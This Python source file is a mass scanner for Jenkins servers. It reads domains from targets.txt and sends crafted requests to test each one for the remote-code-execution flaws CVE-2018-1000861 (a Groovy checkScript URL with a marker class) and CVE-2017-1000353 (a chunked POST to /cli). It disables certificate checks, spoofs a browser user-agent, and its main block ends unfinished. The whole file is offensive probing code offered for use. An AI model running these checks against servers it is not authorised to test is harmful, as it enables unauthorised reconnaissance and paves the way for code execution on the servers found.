import os 
import uuid
import codecs
import requests
import warnings
import threading


poc = {
  "Jenkins RCE CVE-2018-1000861": "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%207bleM4k3r",
  "Jenkins RCE CVE-2017-1000353": ""
}


def CVE_2018_1000861(domain):
    headers = {"User-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"}
    try:
        url = "http://" + domain + "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%207bleM4k3r"
        tmp = requests.get(url, headers=headers, timeout=1, verify=False)
        if "7bleM4k3r" in tmp.text:
            print(" [+] Vulnerability found %s"%url)
            return True
    except:
        try:
            url = "https://" + domain + "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%207bleM4k3r"
            tmp = requests.get(url, headers=headers, timeout=1, verify=False)
            if "7bleM4k3r" in tmp.text:
                print(" [+] Vulnerability found %s"%url)
                return True
        except Exception as e:
            return False
    return False
        
def CVE_2017_1000353(domain):
    session = str(uuid.uuid4())
    headers = {'Side' : 'download'} 
    headers['Content-type'] = 'application/x-www-form-urlencoded' 
    headers['Session'] = session 
    headers['Transfer-Encoding'] = 'chunked'
    try:
        url = "http://" + domain + "/cli"
        tmp = requests.post(url, data=str(b""), headers=headers, stream=True, timeout=1, verify=False)
        if tmp.status_code == 200 and tmp.url == url:
            print(" [+] Vulnerability found %s"%url)
            return True
    except:
        try:
            url = "https://" + domain + "/cli"
            tmp = requests.post(url, data=str(b""), headers=headers, stream=True, timeout=1, verify=False)
            if tmp.status_code == 200 and tmp.url == url:
                print(" [+] Vulnerability found %s"%url)
                return True
        except Exception as e:
            return False
    return False
    

if __name__ == "__main__":
    targets = open("targets.txt","r")
    
    
